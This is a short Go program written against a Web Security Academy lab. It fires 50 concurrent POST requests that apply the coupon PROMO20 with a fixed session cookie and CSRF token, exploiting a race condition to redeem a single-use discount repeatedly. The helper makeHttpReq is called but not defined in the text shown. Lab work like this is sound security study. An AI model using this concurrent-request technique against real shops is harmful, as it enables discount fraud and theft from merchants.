package main

import (
	"net/http"
	"sync"
)

var (
	go_routines = 50

	main_url       = "https://0a71006b043c7584828e20db001a00d3.web-security-academy.net" // should NOT end with "/"
	session_cookie = "XXDKA3daZwcPM170kwPBeDWxzGV2BXYt"

	http_client = http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
)

func main() {
	var wg sync.WaitGroup

	for i := 0; i < go_routines; i++ {
		wg.Add(1)
		go flow(&wg)
	}

	wg.Wait()
}

func flow(wg *sync.WaitGroup) {
	defer wg.Done()

	makeHttpReq(http.MethodPost, main_url+"/cart/coupon", "csrf=5iSjIg2akSSMMdZ70tdGeQuKE572Ez3O&coupon=PROMO20")
}
